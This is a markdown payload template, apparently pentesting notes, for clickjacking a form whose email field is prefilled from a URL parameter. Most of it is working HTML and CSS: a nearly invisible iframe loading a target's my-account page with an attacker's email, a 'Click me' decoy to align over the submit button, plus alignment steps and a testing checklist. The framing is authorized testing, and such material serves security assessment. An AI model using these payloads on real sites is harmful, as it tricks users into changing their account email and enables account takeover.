# Prefilled Form Clickjacking Payload

## Purpose

Payload template for testing clickjacking when a target application allows a form value to be prepopulated through a URL parameter.

The technique combines:

```text
URL-Controlled Form Input
        +
Clickjacking
```

---

## Basic Payload

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET/my-account?email=attacker@example.com"></iframe>
```

---

## Final Payload

After correctly aligning the target control:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://TARGET/my-account?email=attacker@example.com"></iframe>
```

---

## URL Parameter

Example:

```text
/my-account?email=attacker@example.com
```

The parameter should only be used after confirming that the target application actually uses it to prepopulate the form.

---

## Testing Flow

```text
Identify Form
      ↓
Identify URL Parameter
      ↓
Test Parameter
      ↓
Confirm Form Is Prepopulated
      ↓
Load URL in iframe
      ↓
Align Target Button
      ↓
Hide iframe
      ↓
Test Victim Interaction
```

---

## Parameter Testing

Start with a controlled value:

```text
test@example.com
```

Example:

```text
/my-account?email=test@example.com
```

Confirm that the value appears in the target form.

Only then construct the clickjacking PoC.

---

## Alignment

During testing use:

```css
opacity: 0.1;
```

Adjust:

```css
top: 300px;
left: 60px;
```

until the visible decoy is positioned over the target form button.

---

## Final Visibility

After successful alignment:

```css
opacity: 0.0001;
```

---

## Adjustable Parameters

```text
TARGET
/my-account
email
width
height
top
left
opacity
z-index
```

---

## Generic Template

```html
<iframe
    src="https://TARGET/PATH?PARAMETER=VALUE">
</iframe>
```

Example:

```html
<iframe
    src="https://TARGET/my-account?email=attacker@example.com">
</iframe>
```

---

## Testing Checklist

```text
☐ Target is authorized
☐ Sensitive form identified
☐ URL parameter identified
☐ Parameter confirmed to prepopulate form
☐ Target page is frameable
☐ X-Frame-Options checked
☐ CSP frame-ancestors checked
☐ iframe loads correctly
☐ Target button identified
☐ Decoy aligned
☐ Interaction verified
☐ Final PoC tested
```

---

## Key Learning

The important chain is:

```text
URL Parameter
      ↓
Prepopulated Form
      ↓
Clickjacking Overlay
      ↓
Victim Interaction
      ↓
Form Submission
```

The parameter name and behavior are application-specific and must be verified during testing.